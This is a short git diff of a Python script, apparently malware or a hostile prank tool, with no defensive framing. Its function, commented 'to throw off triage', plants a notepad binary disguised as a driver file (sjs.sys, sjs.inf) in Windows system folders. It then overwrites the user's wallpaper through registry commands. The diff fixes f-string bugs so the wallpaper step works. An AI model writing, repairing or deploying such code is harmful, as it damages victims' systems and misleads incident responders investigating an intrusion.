@@ -6,23 +6,23 @@ userProfilePath = os.environ.get('USERPROFILE')
 
 # to throw off triage
 def ufck():
+    # drop notepad in drivers folder
     try:
-        # drop notepad in drivers folder
         with open('c:\\Windows\\System32\\drivers\\sjs.sys', 'wb') as npFile:
             npFile.write(bytes(include.notepad))
         with open('c:\\Windows\\inf\\sjs.inf', 'wb') as npFile:
             npFile.write(bytes(include.notepad))
-
-        # set image as wallpaper
-        with open('{userProfilePath}\\sigma.png', 'wb') as sigma:
-            sigma.write(bytes(include.image[rand.randint(0,3)]))
-
-        # change wallpaper
-        os.system('reg delete "HKCU\Control Panel\Desktop" /v Wallpaper /f')
-        os.system('reg add "HKCU\Control Panel\Desktop" /t REG_SZ /v Wallpaper /d "{userProfilePath}\sigma.png" /f')
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, '{userProfilePath}\\sigma.png', 3)
     except:
-        print('whuh oh :-/')
+        print('wuh oh :-)')
+
+    # set image as wallpaper
+    with open(f'{userProfilePath}\\sigma.png', 'wb') as sigma:
+        sigma.write(bytes(include.images[rand.randint(0,3)]))
+
+    # change wallpaper
+    os.system('reg delete "HKCU\Control Panel\Desktop" /v Wallpaper /f')
+    os.system(f'reg add "HKCU\Control Panel\Desktop" /t REG_SZ /v Wallpaper /d "{userProfilePath}\sigma.png" /f')
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{userProfilePath}\\sigma.png', 3)
 
 
 # mostly unused since everything is stored locally now
